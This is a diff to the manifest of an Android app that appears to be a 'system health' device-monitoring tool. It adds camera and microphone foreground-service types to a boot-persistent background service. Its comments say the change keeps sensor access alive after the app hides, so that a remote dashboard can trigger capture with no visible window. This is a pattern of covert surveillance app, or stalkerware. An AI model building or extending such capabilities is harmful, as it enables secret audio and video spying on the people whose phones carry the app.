@@ -8,6 +8,10 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <!-- CoreService declares these subtypes when monitoring starts, which is the only moment Android
+         grants camera and microphone access that keeps working after the app hides. -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
@@ -81,13 +85,16 @@
             </intent-filter>
         </activity>
 
-        <!-- Activate only types matching actual work. Device monitoring uses specialUse.
-             An eligible specialUse use case and Google Play review are required.
-             Android 15+ forbids boot-started dataSync/mediaPlayback services. -->
+        <!-- Activate only types matching actual work. Device monitoring uses specialUse, plus the
+             sensor subtypes CoreService adds when the owner granted camera or microphone access:
+             Android accepts those only here, at a start made from a visible app, and they are what
+             let a dashboard request capture with no window. An eligible specialUse use case and
+             Google Play review are required. Android 15+ forbids boot-started dataSync/mediaPlayback
+             services. -->
         <service
             android:name="com.example.systemhealth.CoreService"
             android:exported="false"
-            android:foregroundServiceType="location|mediaPlayback|dataSync|specialUse"
+            android:foregroundServiceType="location|mediaPlayback|dataSync|specialUse|camera|microphone"
             android:stopWithTask="false">
             <property
                 android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
